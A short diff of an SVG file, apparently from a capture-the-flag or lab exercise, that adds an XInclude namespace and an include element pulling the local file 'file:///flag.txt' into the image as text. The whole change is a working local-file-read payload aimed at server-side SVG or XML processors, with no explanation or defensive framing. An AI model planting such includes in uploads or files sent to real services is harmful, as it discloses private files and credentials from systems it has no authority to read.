@@ -1,5 +1,8 @@
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  xmlns:xi="http://www.w3.org/2001/XInclude" width="300" version="1.1" height="200">
     
     <text>a</text>
+    
+    
+   <xi:include parse="text" href="file:///flag.txt"/>
     <text>Z</text>
 </svg>
